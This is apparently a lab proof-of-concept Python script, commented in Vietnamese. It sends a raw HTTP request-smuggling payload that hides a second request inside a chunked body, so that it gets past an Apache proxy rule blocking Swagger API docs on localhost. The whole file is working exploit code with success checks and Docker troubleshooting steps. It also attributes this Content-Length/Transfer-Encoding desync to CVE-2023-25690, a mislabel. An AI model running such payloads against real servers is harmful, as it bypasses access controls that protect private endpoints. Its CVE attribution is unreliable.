#!/usr/bin/env python3
"""
CVE-2023-25690 — HTTP Request Smuggling via CL.TE
Gửi 1 yêu cầu HTTP chứa 2 requests để bypass Apache chặn Swagger

Kỹ thuật: Content-Length vs Transfer-Encoding mismatch
- Apache parse theo Content-Length (chỉ thấy request #1)
- Backend parse theo Transfer-Encoding: chunked (thấy cả #1 và #2)
"""

import socket
import sys
from datetime import datetime

HOST = "localhost"
PORT = 8080

def log(msg, level="*"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {level} {msg}")

def send_smuggle():
    """Gửi request smuggle tới Apache"""

    # ===== REQUEST SMUGGLE PAYLOAD =====
    # Cấu trúc:
    # Request #1: GET /app/anything (Apache sẽ chặn vì không phải /v3/api-docs)
    # Request #2: GET /v3/api-docs (ẩn trong body, Apache không parse, backend sẽ thấy)

    smuggle_payload = (
        "GET /app/anything HTTP/1.1\r\n"
        "Host: localhost:8080\r\n"
        "Content-Length: 85\r\n"          # Content-Length = 85 bytes (Apache dùng cái này)
        "Transfer-Encoding: chunked\r\n"  # Transfer-Encoding (Backend dùng cái này!)
        "Connection: keep-alive\r\n"
        "\r\n"
        # Body theo Transfer-Encoding: chunked
        # 0\r\n\r\n = kết thúc chunk encoding
        "0\r\n"
        "\r\n"
        # Request #2 ẩn sau đó (backend sẽ parse)
        "GET /v3/api-docs HTTP/1.1\r\n"
        "Host: localhost:8080\r\n"
        "Connection: close\r\n"
        "\r\n"
    )

    log("Kết nối tới Apache...", level="→")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((HOST, PORT))
        log(f"Kết nối thành công", level="✓")

        log("Gửi payload smuggle...", level="→")
        log(f"Payload:\n{repr(smuggle_payload[:200])}...\n", level="")

        sock.sendall(smuggle_payload.encode())

        log("Chờ response...", level="→")
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass  # Timeout is OK, we got what we need

        sock.close()

        response_str = response.decode('utf-8', errors='replace')

        # ===== ANALYZE RESPONSE =====
        print("\n" + "="*80)
        print("RESPONSE NHẬN ĐƯỢC:")
        print("="*80)
        print(response_str[:2000])  # In 2000 chars đầu

        print("\n" + "="*80)
        print("PHÂN TÍCH KẾT QUẢ:")
        print("="*80)

        # Kiểm tra các dấu hiệu
        has_403 = "403" in response_str
        has_200 = "200 OK" in response_str
        has_swagger_data = "operationId" in response_str or "swagger" in response_str.lower()

        if has_403:
            log("Found 403 Forbidden (Request #1 bị Apache chặn)", level="✓")

        if has_200:
            log("Found 200 OK (Request #2 bypass được!)", level="✓")
        else:
            log("NOT found 200 OK", level="✗")

        if has_swagger_data:
            log("Found Swagger API data (backend trả Swagger schema)", level="✓")

        # VERDICT
        print("\n" + "="*80)
        if has_403 and has_200 and has_swagger_data:
            print("🚨 SMUGGLE THÀNH CÔNG! 🚨")
            print("=" * 80)
            print("✓ Request #1 (GET /app/anything) → 403 Forbidden (Apache chặn)")
            print("✓ Request #2 (GET /v3/api-docs) → 200 OK (Backend cấp quyền)")
            print("✓ Swagger API schema có trong response (bypass thành công)")
            print("\n💥 Apache 2.4.55 DÍNH lỗi CVE-2023-25690!")
            return True
        elif has_403 and not has_200:
            print("❌ Smuggle THẤT BẠI - Chỉ có 403")
            print("=" * 80)
            print("✗ Không thấy 200 OK → Apache có thể đã được patch")
            print("✗ Hoặc backend không available")
            print("\nKiểm tra:")
            print("  1. Apache version: docker compose logs apache_proxy | grep -i version")
            print("  2. Backend status: docker compose ps")
            print("  3. Inspector logs: docker compose logs http_inspector -f")
            return False
        else:
            print("❓ KẾT QUẢ KHÔNG RÕ RÀNG")
            print("=" * 80)
            print("Xem chi tiết response ở trên, hoặc kiểm tra inspector logs")
            return None

    except socket.timeout:
        log("Socket timeout (có thể backend chậm)", level="⚠")
        return None
    except ConnectionRefusedError:
        log(f"Connection refused - Apache không lắng nghe trên {HOST}:{PORT}", level="✗")
        log("Kiểm tra: docker compose ps", level="→")
        return False
    except Exception as e:
        log(f"Lỗi: {type(e).__name__}: {e}", level="✗")
        return False

if __name__ == '__main__':
    print("\n" + "="*80)
    print("CVE-2023-25690 HTTP REQUEST SMUGGLING DEMO")
    print("="*80 + "\n")

    result = send_smuggle()

    print("\n" + "="*80)
    if result is True:
        print("Tiếp theo:")
        print("  1. Xem inspector logs: docker compose logs http_inspector")
        print("  2. Kiểm tra 2 REQ/2 RSP trong logs")
        print("  3. Test với Apache 2.4.58: APACHE_VERSION=2.4.58 docker compose up --build")
        sys.exit(0)
    elif result is False:
        print("Troubleshooting:")
        print("  • docker compose ps (kiểm tra containers up)")
        print("  • docker compose logs apache_proxy (xem Apache logs)")
        print("  • docker compose logs backend_spring (xem backend logs)")
        sys.exit(1)
    else:
        sys.exit(1)
